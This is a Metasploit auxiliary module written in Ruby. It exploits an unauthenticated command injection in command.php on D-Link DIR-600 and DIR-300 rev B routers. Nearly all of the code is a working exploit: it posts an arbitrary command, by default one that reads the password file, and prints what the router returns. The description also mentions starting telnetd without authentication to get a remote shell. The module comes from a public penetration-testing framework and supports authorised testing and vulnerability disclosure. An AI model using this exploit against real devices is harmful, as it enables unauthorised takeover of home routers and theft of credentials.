##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution',
      'Description'     => %q{
          This module exploits an OS Command Injection vulnerability in some D-Link
        Routers like the DIR-600 rev B and the DIR-300 rev B. The vulnerability exists in
        command.php, which is accessible without authentication. This module has been
        tested with the versions DIR-600 2.14b01 and below, DIR-300 rev B 2.13 and below.
        In order to get a remote shell the telnetd could be started without any
        authentication.
      },
      'Author'          => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'OSVDB', '89861' ],
          [ 'EDB', '24453' ],
          [ 'URL', 'http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router' ],
          [ 'URL', 'http://www.s3cur1ty.de/home-network-horror-days' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-003' ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Feb 04 2013'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('CMD', [ true, 'The command to execute', 'cat var/passwd'])
      ])
  end

  def run
    uri = '/command.php'

    print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

    data_cmd = "cmd=#{datastore['CMD']}; echo end"

    begin
      res = send_request_cgi(
        {
          'uri'    => uri,
          'method' => 'POST',
          'data'   => data_cmd
        })
      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /Linux\,\ HTTP\/1.1,\ DIR/)
      return if res.code == 404
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end

    if res.body.include?("end")
      print_good("#{rhost}:#{rport} - Exploited successfully\n")
      print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
      print_line("#{rhost}:#{rport} - Output: #{res.body}")
    else
      print_error("#{rhost}:#{rport} - Exploit failed")
    end
  end
end
